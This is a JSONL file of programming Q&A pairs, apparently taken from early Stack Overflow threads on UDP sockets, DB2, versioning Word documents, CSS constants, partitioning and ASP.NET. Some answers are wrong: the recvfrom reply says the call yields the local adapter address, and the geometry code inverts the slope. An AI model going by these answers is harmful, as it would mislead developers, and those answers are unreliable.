{"instruction": "You have multiple network adapters.\nBind a UDP socket to an local port, without specifying an address.\nReceive packets on one of the adapters.\n\nHow do you get the local ip address of the adapter which received the packet?\nThe question is, \"What is the ip address from the receiver adapter?\" not the address from the sender which we get in the \nreceive_from( ..., &senderAddr, ... );\n\ncall.", "output": "ssize_t\n     recvfrom(int socket, void *restrict buffer, size_t length, int flags,\n         struct sockaddr *restrict address, socklen_t *restrict address_len);\n\n     ssize_t\n     recvmsg(int socket, struct msghdr *message, int flags);\n\n[..]\n     If address is not a null pointer and the socket is not connection-oriented, the\n     source address of the message is filled in.\n\nActual code:\n\nint nbytes = recvfrom(sock, buf, MAXBUFSIZE, MSG_WAITALL, (struct sockaddr *)&bindaddr, &addrlen);\nfprintf(stdout, \"Read %d bytes on local address %s\\n\", nbytes, inet_ntoa(bindaddr.sin_addr.s_addr));\n\nhope this helps."}
{"instruction": "I am trying to get the DB2 data provider from a 32-bit .Net application to connect to DB2 running as a 32-bit application on Vista 64 (is that confusing enough yet)?  Unfortunately, I am getting the following error:\n\nSQL1159 Initialization error with DB2 .NET Data Provider, reason code 7, tokens 9.5.0.DEF.2, SOFTWARE\\IBM\\DB2\\InstalledCopies\n\nThere are several IBM forum posts mentioning it, but little useful guidance.  Has anyone experienced this before?  Or do you have better ideas for fixing it?", "output": "Are you required to have it run as x86? I had similar issues with web apps under Visual Studio's dev web server (which is x86), but switching over to IIS (x64) worked for me. Since I was deploying to IIS x64, I called it a day at that point.\nI tried tracing with Filemon and Regmon, but didn't get any denied or missing keys errors. If I were to look again, I'd check HKLM\\Software\\WOW6432Node, guessing that the installer writes to the x64 HKLM\\Software node, but not the x86 one."}
{"instruction": "You have multiple network adapters.\nBind a UDP socket to an local port, without specifying an address.\nReceive packets on one of the adapters.\n\nHow do you get the local ip address of the adapter which received the packet?\nThe question is, \"What is the ip address from the receiver adapter?\" not the address from the sender which we get in the \nreceive_from( ..., &senderAddr, ... );\n\ncall.", "output": "You could enumerate all the network adapters, get their IP addresses and compare the part covered by the subnet mask with the sender's address.\nLike:\nIPAddress FindLocalIPAddressOfIncomingPacket( senderAddr )\n{\n    foreach( adapter in EnumAllNetworkAdapters() )\n    {\n        adapterSubnet = adapter.subnetmask & adapter.ipaddress;\n        senderSubnet = adapter.subnetmask & senderAddr;\n        if( adapterSubnet == senderSubnet )\n        {\n            return adapter.ipaddress;\n        }\n    }\n}"}
{"instruction": "You have multiple network adapters.\nBind a UDP socket to an local port, without specifying an address.\nReceive packets on one of the adapters.\n\nHow do you get the local ip address of the adapter which received the packet?\nThe question is, \"What is the ip address from the receiver adapter?\" not the address from the sender which we get in the \nreceive_from( ..., &senderAddr, ... );\n\ncall.", "output": "G'day,\nI assume that you've done your bind using INADDR_ANY to specify the address.\nIf this is the case, then the semantics of INADDR_ANY is such that a UDP socket is created on the port specified on all of your interfaces. The socket is going to get all packets sent to all interfaces on the port specified.\nWhen sending using this socket, the lowest numbered interface is used. The outgoing sender's address field is set to the IP address of that first outgoing interface used.\nFirst outgoing interface is defined as the sequence when you do an ifconfig -a. It will probably be eth0.\nHTH.\ncheers,\nRob"}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "If you use WinMerge it has added support for merging Word and Excel binary files."}
{"instruction": "What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? \nWe are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?\nWe have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.", "output": "Take a look at Hudson. It's highly customizable, and, IMHO, easier than CruiseControl."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "Sharepoint also does a good (ok decent) job of versioning MS-specific documents."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "What on Earth are you all Word-is-binary-so-no-diff people talking about? TortoiseSVN, for example, integrates right out of the box with Word and enables you to use Word's built-in diff and merge functionality. It works just fine.\nI have worked on projects that store documents in version control. It has worked out pretty well, although if people are unfamiliar with version control, they are probably going to have conceptual difficulties with things like \"working copy\" and \"merge\" and \"conflict\". Don't overestimate the users' capabilities when you plan your document management system.\nI believe there exist big and powerful commercial solutions for all of this, as well. I'm sure if you have enough kilodollars, you can get something that fits your needs perfectly. Document management systems are a big business for big enterprise."}
{"instruction": "I am having trouble finding good guides for WPF.\nI have experience in C# and .NET but  I don't know anything about WPF except for the regular marketing-ish description of the technology as a whole.\nCan anyone point me to a good beginner's tutorial/guide on WPF.", "output": "Programming WPF by Chris Sells and Ian Griffiths is an excellent way to learn WPF.  5 star rated on Amazon with 50+ reviews.  http://www.amazon.com/Programming-WPF-Chris-Sells/dp/0596510373"}
{"instruction": "Is there a site for unit testing as RefactorMyCode for refactoring? I think it would be a great help for beginners like me.", "output": "As for a practical example of how TDD/unit-testing can be applied, I really liked the \nTDD - Practical Guide by David Astels book. While it's focussed on Java, and uses an older version of JUnit and EasyMock in the example code, it gave me a really good idea on how to use unit testing/TDD on an actual project."}
{"instruction": "So I'm working on some legacy code that's heavy on the manual database operations. I'm trying to maintain some semblance of quality here, so I'm going TDD as much as possible.\nThe code I'm working on needs to populate, let's say a List<Foo> from a DataReader that returns all the fields required for a functioning Foo. However, if I want to verify that the code in fact returns one list item per one database row, I'm writing test code that looks something like this:\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 1);\n// ....\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 2);\n// ....\nExpect.Call(reader.Read()).Return(false);\n\nWhich is rather tedious and rather easily broken, too. \nHow should I be approaching this issue so that the result won't be a huge mess of brittle tests?\nBtw I'm currently using Rhino.Mocks for this, but I can change it if the result is convincing enough. Just as long as the alternative isn't TypeMock, because their EULA was a bit too scary for my tastes last I checked.\nEdit: I'm also currently limited to C# 2.", "output": "You can put the Foo instances in a list and compare the objects with what you read:  \nvar arrFoos = new Foos[]{...}; // what you expect\nvar expectedFoos = new List<Foo>(arrFoos); // make a list from the hardcoded array of expected Foos\nvar readerResult = ReadEntireList(reader); // read everything from reader and put in List<Foo>\nExpect.ContainSameFoos(expectedFoos, readerResult); // compare the two lists"}
{"instruction": "I'm setting up a dedicated SQL Server 2005 box on Windows Server 2008 this week, and would like to pare it down to be as barebones as possible while still being fully functional.\nTo that end, the \"Server Core\" option sounds appealing, but I'm not clear about whether or not I can run SQL Server on that SKU.  Several services are addressed on the Microsoft website, but I don't see any indication about SQL Server.\nDoes anyone know definitively?", "output": "Server Core won't be very useful (to me at least, and I think many others as well) until they get a version of .Net framework on it.  Maybe a specialized subset like they have in the Compact Framework on smart phones."}
{"instruction": "I am having trouble finding good guides for WPF.\nI have experience in C# and .NET but  I don't know anything about WPF except for the regular marketing-ish description of the technology as a whole.\nCan anyone point me to a good beginner's tutorial/guide on WPF.", "output": "Sacha Barber has a great series of articles on WPF for Beginners over at Codeproject that you can check out.\n\nAn Introduction to the WPF Layout System\nAn introduction into XAML / code and WPF resources\nAn introduction into RoutedEvents / RoutedCommands\nAn introduction into WPF Dependancy Properties\nAn introduction into WPF Styles And Templates"}
{"instruction": "my school maths are very rusty and I think this is a good opportunity to take advance of this community :D\nI have two points (a line) and a rectangle, I would like to know how to calculate if the line intersects the rectangle, my first approach had so many \"if\" statements that the compiler sent me a link to this site.\nThanks for your time!", "output": "Do http://mathworld.wolfram.com/Line-LineIntersection.html for the line and each side of the rectangle.\nOr: http://mathworld.wolfram.com/Line-PlaneIntersection.html"}
{"instruction": "my school maths are very rusty and I think this is a good opportunity to take advance of this community :D\nI have two points (a line) and a rectangle, I would like to know how to calculate if the line intersects the rectangle, my first approach had so many \"if\" statements that the compiler sent me a link to this site.\nThanks for your time!", "output": "From my \"Geometry\" class:\npublic struct Line\n{\n    public static Line Empty;\n\n    private PointF p1;\n    private PointF p2;\n\n    public Line(PointF p1, PointF p2)\n    {\n        this.p1 = p1;\n        this.p2 = p2;\n    }\n\n    public PointF P1\n    {\n        get { return p1; }\n        set { p1 = value; }\n    }\n\n    public PointF P2\n    {\n        get { return p2; }\n        set { p2 = value; }\n    }\n\n    public float X1\n    {\n        get { return p1.X; }\n        set { p1.X = value; }\n    }\n\n    public float X2\n    {\n        get { return p2.X; }\n        set { p2.X = value; }\n    }\n\n    public float Y1\n    {\n        get { return p1.Y; }\n        set { p1.Y = value; }\n    }\n\n    public float Y2\n    {\n        get { return p2.Y; }\n        set { p2.Y = value; }\n    }\n}\n\npublic struct Polygon: IEnumerable<PointF>\n{\n    private PointF[] points;\n\n    public Polygon(PointF[] points)\n    {\n        this.points = points;\n    }\n\n    public PointF[] Points\n    {\n        get { return points; }\n        set { points = value; }\n    }\n\n    public int Length\n    {\n        get { return points.Length; }\n    }\n\n    public PointF this[int index]\n    {\n        get { return points[index]; }\n        set { points[index] = value; }\n    }\n\n    public static implicit operator PointF[](Polygon polygon)\n    {\n        return polygon.points;\n    }\n\n    public static implicit operator Polygon(PointF[] points)\n    {\n        return new Polygon(points);\n    }\n\n    IEnumerator<PointF> IEnumerable<PointF>.GetEnumerator()\n    {\n        return (IEnumerator<PointF>)points.GetEnumerator();\n    }\n\n    public IEnumerator GetEnumerator()\n    {\n        return points.GetEnumerator();\n    }\n}\n\npublic enum Intersection\n{\n    None,\n    Tangent,\n    Intersection,\n    Containment\n}\n\npublic static class Geometry\n{\n\n    public static Intersection IntersectionOf(Line line, Polygon polygon)\n    {\n        if (polygon.Length == 0)\n        {\n            return Intersection.None;\n        }\n        if (polygon.Length == 1)\n        {\n            return IntersectionOf(polygon[0], line);\n        }\n        bool tangent = false;\n        for (int index = 0; index < polygon.Length; index++)\n        {\n            int index2 = (index + 1)%polygon.Length;\n            Intersection intersection = IntersectionOf(line, new Line(polygon[index], polygon[index2]));\n            if (intersection == Intersection.Intersection)\n            {\n                return intersection;\n            }\n            if (intersection == Intersection.Tangent)\n            {\n                tangent = true;\n            }\n        }\n        return tangent ? Intersection.Tangent : IntersectionOf(line.P1, polygon);\n    }\n\n    public static Intersection IntersectionOf(PointF point, Polygon polygon)\n    {\n        switch (polygon.Length)\n        {\n            case 0:\n                return Intersection.None;\n            case 1:\n                if (polygon[0].X == point.X && polygon[0].Y == point.Y)\n                {\n                    return Intersection.Tangent;\n                }\n                else\n                {\n                    return Intersection.None;\n                }\n            case 2:\n                return IntersectionOf(point, new Line(polygon[0], polygon[1]));\n        }\n\n        int counter = 0;\n        int i;\n        PointF p1;\n        int n = polygon.Length;\n        p1 = polygon[0];\n        if (point == p1)\n        {\n            return Intersection.Tangent;\n        }\n\n        for (i = 1; i <= n; i++)\n        {\n            PointF p2 = polygon[i % n];\n            if (point == p2)\n            {\n                return Intersection.Tangent;\n            }\n            if (point.Y > Math.Min(p1.Y, p2.Y))\n            {\n                if (point.Y <= Math.Max(p1.Y, p2.Y))\n                {\n                    if (point.X <= Math.Max(p1.X, p2.X))\n                    {\n                        if (p1.Y != p2.Y)\n                        {\n                            double xinters = (point.Y - p1.Y) * (p2.X - p1.X) / (p2.Y - p1.Y) + p1.X;\n                            if (p1.X == p2.X || point.X <= xinters)\n                                counter++;\n                        }\n                    }\n                }\n            }\n            p1 = p2;\n        }\n\n        return (counter % 2 == 1) ? Intersection.Containment : Intersection.None;\n    }\n\n    public static Intersection IntersectionOf(PointF point, Line line)\n    {\n        float bottomY = Math.Min(line.Y1, line.Y2);\n        float topY = Math.Max(line.Y1, line.Y2);\n        bool heightIsRight = point.Y >= bottomY &&\n                             point.Y <= topY;\n        //Vertical line, slope is divideByZero error!\n        if (line.X1 == line.X2)\n        {\n            if (point.X == line.X1 && heightIsRight)\n            {\n                return Intersection.Tangent;\n            }\n            else\n            {\n                return Intersection.None;\n            }\n        }\n        float slope = (line.X2 - line.X1)/(line.Y2 - line.Y1);\n        bool onLine = (line.Y1 - point.Y) == (slope*(line.X1 - point.X));\n        if (onLine && heightIsRight)\n        {\n            return Intersection.Tangent;\n        }\n        else\n        {\n            return Intersection.None;\n        }\n    }\n\n}"}
{"instruction": "my school maths are very rusty and I think this is a good opportunity to take advance of this community :D\nI have two points (a line) and a rectangle, I would like to know how to calculate if the line intersects the rectangle, my first approach had so many \"if\" statements that the compiler sent me a link to this site.\nThanks for your time!", "output": "well, if it's 2-D, then all lines are on the only plane.\nSo this is basic 3-D geometry.  You should be able to do this with a straightforward equation.\nCheck out this page: http://local.wasp.uwa.edu.au/~pbourke/geometry/planeline/  The second solution should be easy to implement in code, as long as you translate the coordinates of your rectangle into the equation of a plane.  \nCheck that your denominator isn't zero (line doesn't intersect or is contained in the plane) and you'll be good to go."}
{"instruction": "I have a custom SharePoint application page deployed to the _layouts folder.  It's a custom \"new form\" for a custom content type.  During my interactions with this page, I will need to add an item to my list.  When the page first loads, I can use SPContext.Current.List to see the current list I'm working with.  But after I fill in my form and the form posts back onto itself and IsPostBack is true, then SPContext.Current.List is null so I can't find the list that I need to add my stuff into.\nIs this expected?\nHow should I retain some info about my context list across the postback?  Should I just populate some asp:hidden control with my list's guid and then just pull it back from that on the postback?  That seems safe, I guess.\nFWIW, this is the MOSS 2007 Standard version.", "output": "I'm not using a custom \"new form\", so this might not apply.  I added an event receiver to my custom content type and then do my custom code in the ItemAdded or ItemAdding events.  This code fires when the event is added to a list.  You can use the event receiver properties to get to the parent List, Web, and Site."}
{"instruction": "Are there any useful techniques for reducing the repetition of constants in a CSS file?\n(For example, a bunch of different selectors which should all apply the same colour, or the same font size)?", "output": "You can use multiple inheritance in your html elements (e.g. <div class=\"one two\">) but I'm not aware of a way of having constants in the CSS files themselves.\nThis link (the first found when googling your question) seems to have a fairly indepth look at the issue:\nhttp://icant.co.uk/articles/cssconstants/"}
{"instruction": "Are there any useful techniques for reducing the repetition of constants in a CSS file?\n(For example, a bunch of different selectors which should all apply the same colour, or the same font size)?", "output": "You should comma seperate each id or class for example:\nh1,h2 {\n  color: #fff;\n}"}
{"instruction": "Are there any useful techniques for reducing the repetition of constants in a CSS file?\n(For example, a bunch of different selectors which should all apply the same colour, or the same font size)?", "output": "As far as I know, without programmatically generating the CSS file, there's no way to, say, define your favorite shade of blue (#E0EAF1) in one and only one spot.\nYou could pretty easily write a computer program to generate the file.  Execute a simple find-and-replace operation and then save as a .css file.\nGo from this source.css\u2026\nh1,h2 {\n  color: %%YOURFAVORITECOLOR%%;\n}\n\ndiv.something {\n  border-color: %%YOURFAVORITECOLOR%%;\n}\n\nto this target.css\u2026\nh1,h2 {\n  color: #E0EAF1;\n}\n\ndiv.something {\n  border-color: #E0EAF1;\n}\n\nwith code like this\u2026 (VB.NET)\nDim CssText As String = System.IO.File.ReadAllText(\"C:\\source.css\")\nCssText = CssText.Replace(\"%%YOURFAVORITECOLOR%%\", \"#E0EAF1\")\nSystem.IO.File.WriteAllText(\"C:\\target.css\", CssText)"}
{"instruction": "Are there any useful techniques for reducing the repetition of constants in a CSS file?\n(For example, a bunch of different selectors which should all apply the same colour, or the same font size)?", "output": "Elements can belong to more than one class, so you can do something like this:  \n.DefaultBackColor\n{\n    background-color: #123456;\n}\n.SomeOtherStyle\n{\n    //other stuff here\n}\n.DefaultForeColor\n{\n    color:#654321;\n}\n\nAnd then in the content portion somewhere:  \n<div class=\"DefaultBackColor SomeOtherStyle DefaultForeColor\">Your content</div>\n\nThe weaknesses here are that it gets pretty wordy in the body and you're unlikely to be able to get it down to listing a color only once.  But you might be able to do it only two or three times and you can group those colors together, perhaps in their own sheet.  Now when you want to change the color scheme they're all together and the change is pretty simple.\nBut, yeah, my biggest complain with CSS is the inability to define your own constants."}
{"instruction": "We are a small team of 3 developers (2 experienced but new to  this particular business sector) developing a functionally complex product.  We're using Scrum and have a demo at the end of each sprint.  Its clear that the functional team have plenty of ideas but these are not well communicated to the development team and the demo poses more questions than answers. \nHave you any recommendations for improving the the quality of input from the functional people?\nFurther info: I think part of the problem is that there are no specs or  User Stories as such.  Personally I think they need to be writing down some sort of requirements - what sort of things should they be writing down and to what complexity given its an agile process?\nTIA", "output": "I'm a big believer in Use Cases, detailing the system behaviour in response to user actions.  Collectively these can form a loose set of requirements, and in a SCRUM environment can help you prioritise the Use Cases which will form that particular sprint's implemented features.\nFor example, after talking to your functional team you identify 15 separate Use Cases.  You prioritise the Use Cases, and decided to plan for 5 sprints.  And the end of each sprint you go through and demo the product fulfilling the Use Cases implemented during the sprint, noting the feedback and amending the Use Cases."}
{"instruction": "I have a new 1 TB drive coming in tomorrow. What is the best way to divide this space for a development workstation?\nThe biggest problem I think I'm going to have is that some partitions (probably /usr) will become to small after a bit of use. Other partitions are probably to huge. The swap drive for example is currently 2GB (2x 1GB RAM), but it is almost never used (only once that I know of).", "output": "Please tell me what are you doing to /boot that you need more than 64MB on it? Unless you never intend to clean it, anything more is a waste of space. Kernel image + initrd + System.map won't take more than 10MB (probably less - mine weight 5MB) and you really don't need to keep more than two spares.\nAnd with the current prices of RAM - if you are needing swap, you'll be much better off buying more memory. Reserve 1GB for swap and have something monitoring it's usage (no swap at all is bad idea because the machine might lock up when it runs out of free memory)."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "ASP.NET MVC will probably be the de facto standard on the .NET platform. Also, MonoRail has been around for quite a while and still doesn't support caching. It seems like a very difficult thing to do, and is a major drawback if you ask me."}
{"instruction": "I have some C# / asp.net code I inherited which has a textbox which I want to make multiline. I did so by adding textmode=\"multiline\" but when I try to insert a newline, the enter key instead submits the form :P\nI googled around and it seems like the default behavior should be for enter (or control-enter) to insert a newline. Like I said I inherited the code so I'm not sure if there's javascript monkeying around or if there's just a simple asp.net thing I have to do.", "output": "I suspect it's (like you say) some custom javascript code.\nThe original asp.net control works fine... you are going to have to check the code"}
{"instruction": "I have some C# / asp.net code I inherited which has a textbox which I want to make multiline. I did so by adding textmode=\"multiline\" but when I try to insert a newline, the enter key instead submits the form :P\nI googled around and it seems like the default behavior should be for enter (or control-enter) to insert a newline. Like I said I inherited the code so I'm not sure if there's javascript monkeying around or if there's just a simple asp.net thing I have to do.", "output": "Are you handling the textchanged event for the textbox?  That would mean ASP.Net sets the textbox to cause a postback (submit the page) for anything the might cause the textbox to lose focus, including the enter key."}
{"instruction": "I have some C# / asp.net code I inherited which has a textbox which I want to make multiline. I did so by adding textmode=\"multiline\" but when I try to insert a newline, the enter key instead submits the form :P\nI googled around and it seems like the default behavior should be for enter (or control-enter) to insert a newline. Like I said I inherited the code so I'm not sure if there's javascript monkeying around or if there's just a simple asp.net thing I have to do.", "output": "I created a sample page with a TextBox and a Button and it worked fine for me:\n<asp:TextBox runat=\"server\" ID=\"textbox1\" TextMode=\"MultiLine\" />\n<br />\n<br />\n<asp:Button runat=\"server\" ID=\"button1\" Text=\"Button 1\" onclick=\"button1_Click\" />\n\nSo it most likely depends on either some other property you have set, or some other control on the form.\nEdit: TextChanged event is only triggered when the TextBox loses focus, so that can't be the issue."}
{"instruction": "I am using xampp on Windows, but I would like to use something closer to my server setup.\nFederico Cargnelutti tutorial explains how to setup LAMP VMWARE appliance; it is a great introduction to VMware appliances, but one of the commands was not working and it doesn't describe how to change the keyboard layout and the timezone.\nps: the commands are easy to find but I don't want to look for them each time I reinstall the server. I am using this question as a reminder.", "output": "Provided this question is properly tagged, you can select LAMP server option during installation of Ubuntu. This will install and configure all required components automatically. A detailed instruction on how to do this can be found, for example, there: http://www.ubuntugeek.com/ubuntu-804-hardy-heron-lamp-server-setup.html"}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "Have a look at Sharepoint. If cost is an issue, Sharepoint portal sevices can also work for you. Read this for more info"}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "For what it's worth, there is also Google Docs. I guess it's not a perfect fit, but it's versioning is very convenient."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "Just wanted to clarify an answer someone gave but I don't have enough points yet.\ndiff will work on binary files but it is only going to say something not really useful like \"toto1 and toto2 binary files differ\"."}
{"instruction": "I have some C# / asp.net code I inherited which has a textbox which I want to make multiline. I did so by adding textmode=\"multiline\" but when I try to insert a newline, the enter key instead submits the form :P\nI googled around and it seems like the default behavior should be for enter (or control-enter) to insert a newline. Like I said I inherited the code so I'm not sure if there's javascript monkeying around or if there's just a simple asp.net thing I have to do.", "output": "I can't find that \"WebForm_FireDefaultButton\" javascript anywhere, is it something asp.net is generating?\n\nYes.\nThat's generated to support the DefaultButton functionality of the form and/or Panel containing your controls.  This is the source for it:\nfunction WebForm_FireDefaultButton(event, target) {\n  if (event.keyCode == 13) {\n    var src = event.srcElement || event.target;\n    if (!src || (src.tagName.toLowerCase() != \"textarea\")) {\n      var defaultButton;\n      if (__nonMSDOMBrowser) {\n        defaultButton = document.getElementById(target);\n      }\n      else {\n        defaultButton = document.all[target];\n      }\n      if (defaultButton && typeof (defaultButton.click) != \"undefined\") {\n        defaultButton.click();\n        event.cancelBubble = true;\n        if (event.stopPropagation) event.stopPropagation();\n        return false;\n      }\n    }\n  }\n  return true;\n}"}
{"instruction": "I'm giving a presentation to a Java User's Group on Groovy and I'm going to be doing some coding during the presentation to show some side-by-side Java/Groovy.  I really like the GroovyConsole as it's simple and I can resize the text easily.  \nI'm wondering if there is anything similar for Java?  I know I could just use Eclipse but I'd rather have a smaller app to use without having to customize a view.  What's the community got?\nScreen shot of GroovyConsole:", "output": "DrJava is your best bet. It also has an Eclipse plugin to use the interactions pane like GroovyConsole."}
{"instruction": "I'm giving a presentation to a Java User's Group on Groovy and I'm going to be doing some coding during the presentation to show some side-by-side Java/Groovy.  I really like the GroovyConsole as it's simple and I can resize the text easily.  \nI'm wondering if there is anything similar for Java?  I know I could just use Eclipse but I'd rather have a smaller app to use without having to customize a view.  What's the community got?\nScreen shot of GroovyConsole:", "output": "try beanshell. its a scripting wrapper over java. http://www.beanshell.org/"}
{"instruction": "I have a new 1 TB drive coming in tomorrow. What is the best way to divide this space for a development workstation?\nThe biggest problem I think I'm going to have is that some partitions (probably /usr) will become to small after a bit of use. Other partitions are probably to huge. The swap drive for example is currently 2GB (2x 1GB RAM), but it is almost never used (only once that I know of).", "output": "@wvdschel:\nDon't create separate partitions for each user. Unused space on each partition is wasted.\nInstead create one partition for all users. Use quota if necessary to limit each user's space. It's much more flexible than partitioning or LVM.\nOTOH, one huge partition is usually a bit slower, depending on the file system."}
{"instruction": "I have a new 1 TB drive coming in tomorrow. What is the best way to divide this space for a development workstation?\nThe biggest problem I think I'm going to have is that some partitions (probably /usr) will become to small after a bit of use. Other partitions are probably to huge. The swap drive for example is currently 2GB (2x 1GB RAM), but it is almost never used (only once that I know of).", "output": "Did you know 1TB can easily take up to half an hour to fsck? Workstations usually crash and reboot more often than servers, so that can get quite annoying. Do you really need all that space?"}
{"instruction": "I have a new 1 TB drive coming in tomorrow. What is the best way to divide this space for a development workstation?\nThe biggest problem I think I'm going to have is that some partitions (probably /usr) will become to small after a bit of use. Other partitions are probably to huge. The swap drive for example is currently 2GB (2x 1GB RAM), but it is almost never used (only once that I know of).", "output": "I would go with a 1 GB for /boot, 100 GB for /, and the rest for /home.  1 GB is probably too high for /boot, but it's not like you'll miss it.  100 GB might seem like a lot for everything outside home, until you start messing around with Databases and realize that MySQL keeps databases in /var.  Best to leave some room to grow in that area. The reason that I recommend using a separtate partition for /home, is that when you want to completely switch distros, or if the upgrade option on your distro of choice, for whatever reason doesn't work, or if you just want to start from scratch and do a clean system install, you can just format / and /boot, and leave home with all the user data intact."}
{"instruction": "I'm currently using VS2005 Profesional and .NET 2.0, and since our project is rather large (25 projects in the solution), I'd like to try VS 2008, since its theoretically faster with larger projects. \nBefore doing such thing, i'd like to know if what I've read is true: can I use VS2008 in \".net 2.0\" mode? I don't want my customers to install .net 3.0 or .3.5, I just want to install VS2008, open my solution and start working from there. \nIs this possible?\nP.D.: the solution is a c# Window Forms project.", "output": "yes, vs2008 can \"target\" a framework, but i think by default, if converting from vs2005 - vs2008 it just keeps it at framework 2.0"}
{"instruction": "I'm currently using VS2005 Profesional and .NET 2.0, and since our project is rather large (25 projects in the solution), I'd like to try VS 2008, since its theoretically faster with larger projects. \nBefore doing such thing, i'd like to know if what I've read is true: can I use VS2008 in \".net 2.0\" mode? I don't want my customers to install .net 3.0 or .3.5, I just want to install VS2008, open my solution and start working from there. \nIs this possible?\nP.D.: the solution is a c# Window Forms project.", "output": "It is possible to have a 2.0 project in VS 2008. You would just target .NET Framework 2.0 under the project properties.\nYour solution will have to be converted to a VS9 solution however."}
